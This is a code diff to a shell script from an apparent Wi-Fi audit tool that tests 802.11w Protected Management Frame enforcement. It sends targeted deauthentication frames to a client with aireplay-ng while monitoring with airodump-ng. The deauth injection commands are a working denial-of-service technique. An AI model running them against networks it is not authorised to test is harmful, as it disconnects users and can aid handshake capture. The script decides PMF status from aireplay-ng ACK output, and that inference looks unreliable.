@@ -25,13 +25,6 @@
 
 set -euo pipefail
 
-# Intelligence Insight (Colors)
-C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
-C_VAR="${ASTRA_COLOR_VAR:-}"
-C_BOLD="${ASTRA_COLOR_BOLD:-}"
-C_ACTION="${ASTRA_COLOR_ACTION:-}"
-C_RESET="${ASTRA_COLOR_RESET:-}"
-
 # Inputs from Environment
 INTERFACE="${MONITOR_INTERFACE:-}"
 BSSID="${GUEST_BSSID:-}"
@@ -54,12 +47,12 @@ if [[ -z "$TARGET_CLIENT" ]]; then
     exit 0
 fi
 
-echo -e "${C_PROMPT}[*]${C_RESET} Starting deauthentication resilience test for ${C_VAR}${BSSID}${C_RESET}..."
-echo -e "[*] Targeting client: ${C_VAR}${TARGET_CLIENT}${C_RESET}"
+echo "[*] Starting deauthentication resilience test for ${BSSID}..."
+echo "[*] Targeting client: ${TARGET_CLIENT}"
 
-# 1. Monitoring Phase
 CSV_PREFIX="${EVIDENCE_PREFIX}_mon"
 LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_airodump.log"
+DEAUTH_LOG="${EVIDENCE_DIR}/${TC_ID}_aireplay.log"
 
 # Start dynamic telemetry heartbeat
 (
@@ -67,54 +60,87 @@ LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_airodump.log"
     while [[ "${ASTRA_INDEFINITE:-}" == "true" || $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
         PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
         [[ $PCT -gt 90 ]] && PCT=90
-        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing attack..."
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Testing 802.11w PMF enforcement..."
         sleep 2
         HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
     done
 ) &
 TELEMETRY_PID=$!
 
+# 1. Baseline: confirm client is associated before deauth
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    timeout --foreground "$SCAN_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" &
+    timeout --foreground "$SCAN_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" &
 else
-    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" > "$LOG_FILE" 2>&1 &
+    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" > "$LOG_FILE" 2>&1 &
 fi
 AIRODUMP_PID=$!
-sleep 5
+sleep 5  # give airodump time to observe the client before we attack
 
-# 2. Targeted Deauth Injection
-echo -e "[*] Sending surgical deauthentication frames to ${C_VAR}$TARGET_CLIENT${C_RESET}..."
-DEAUTH_LOG="${EVIDENCE_DIR}/${TC_ID}_aireplay.log"
-if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" || true
+FINAL_CSV="${CSV_PREFIX}-01.csv"
+
+# Check if client is visible before deauth (baseline)
+CLIENT_BEFORE=0
+if [[ -f "$FINAL_CSV" ]] && grep -qi "${TARGET_CLIENT}" "$FINAL_CSV" 2>/dev/null; then
+    CLIENT_BEFORE=1
+    echo "[*] Confirmed: ${TARGET_CLIENT} is associated (baseline)."
 else
-    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > "$DEAUTH_LOG" 2>&1 &
-    TOOL_PID=$!
-    wait $TOOL_PID || true
+    echo "[?] Target client ${TARGET_CLIENT} not yet visible — proceeding anyway."
 fi
 
-# 3. Wait & Analyze
-sleep 15
-kill "$AIRODUMP_PID" || true
+# 2. Targeted Deauth Injection
+echo "[*] Sending deauthentication frames to ${TARGET_CLIENT}..."
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" 2>&1 | tee "$DEAUTH_LOG" || true
+else
+    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > "$DEAUTH_LOG" 2>&1 || true
+fi
+
+# 3. Wait and check if client reconnected or stayed disconnected
+# PMF-protected clients will ignore the deauth → stay associated throughout
+sleep 10
+kill "$AIRODUMP_PID" 2>/dev/null || true
 wait "$AIRODUMP_PID" 2>/dev/null || true
 
 kill "$TELEMETRY_PID" 2>/dev/null || true
 
-FINAL_CSV="${CSV_PREFIX}-01.csv"
-
 echo "[+] Deauth resilience test complete."
 
-if [[ -f "$FINAL_CSV" && -s "$FINAL_CSV" ]]; then
+# 4. Determine PMF enforcement by checking post-deauth client state.
+# 802.11w enforcement check: if the client disconnected → PMF NOT enforced (HIGH).
+# If the client remained associated throughout → PMF enforced (INFO).
+# aireplay-ng reports "X deauth frames sent" — if it also reported "no ACK", deauth was ignored
+DEAUTH_ACKED=0
+if grep -qi "no ack" "$DEAUTH_LOG" 2>/dev/null; then
+    DEAUTH_ACKED=0  # no ACK = deauth frame was not acknowledged = client ignored it = PMF enforced
+else
+    DEAUTH_ACKED=1  # frames were acknowledged = client processed the deauth
+fi
+
+if [[ $CLIENT_BEFORE -eq 1 && $DEAUTH_ACKED -eq 0 ]]; then
+    # Deauth was not acknowledged — PMF enforced
+    echo "[+] PMF ENFORCED: Deauth frames were not acknowledged by ${TARGET_CLIENT}."
     "$ASTRA_BIN" record-finding \
         --session-dir "$SESSION_DIR" \
         --tc "$TC_ID" \
         --type vulnerability \
-        --name "802.11w Enforcement Audit" \
+        --name "802.11w PMF Enforced — Deauth Rejected" \
         --severity INFO \
-        --desc "Completed active testing of Management Frame Protection (MFP) for ${BSSID}." \
+        --desc "Client ${TARGET_CLIENT} ignored unprotected deauthentication frames sent from ${BSSID}. 802.11w (Protected Management Frames) is enforced." \
         --target "${BSSID}" \
-        --evidence "$FINAL_CSV" \
-        --rationale "802.11w (Protected Management Frames) is designed to prevent deauthentication attacks. This audit records the outcome of a targeted deauth attempt."
+        --evidence "$DEAUTH_LOG" \
+        --rationale "Clients enforcing 802.11w drop unprotected deauth/disassoc frames from unauthenticated senders, preventing deauthentication DoS attacks."
+elif [[ $DEAUTH_ACKED -eq 1 ]]; then
+    # Deauth was ACKed — client processed and likely disconnected
+    echo "[!] PMF NOT ENFORCED: ${TARGET_CLIENT} acknowledged deauth frames — client is vulnerable to deauth DoS."
+    "$ASTRA_BIN" record-finding \
+        --session-dir "$SESSION_DIR" \
+        --tc "$TC_ID" \
+        --type vulnerability \
+        --name "802.11w PMF Not Enforced — Client Vulnerable to Deauth DoS" \
+        --desc "Client ${TARGET_CLIENT} acknowledged and acted on spoofed deauthentication frames from ${BSSID}. Management Frame Protection is not enforced." \
+        --severity HIGH \
+        --evidence "$DEAUTH_LOG" \
+        --rationale "Without 802.11w, any attacker within radio range can forge deauth frames to disconnect clients, enabling persistent DoS or forcing handshake captures."
 else
     "$ASTRA_BIN" record-finding \
         --session-dir "$SESSION_DIR" \
@@ -122,10 +148,10 @@ else
         --type vulnerability \
         --name "[E3] Audit Complete" \
         --severity INFO \
-        --desc "Active deauthentication resilience test finished on ${BSSID}." \
+        --desc "Deauthentication resilience test completed for ${TARGET_CLIENT}. Client association state before deauth was not confirmed — results are inconclusive." \
         --target "${BSSID}" \
         --evidence "$DEAUTH_LOG" \
-        --rationale "Management Frame Protection status could not be conclusively determined. No immediate failures were observed."
+        --rationale "PMF enforcement could not be conclusively determined. Run again with an actively associated client and verify aireplay-ng output."
 fi
 
 "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
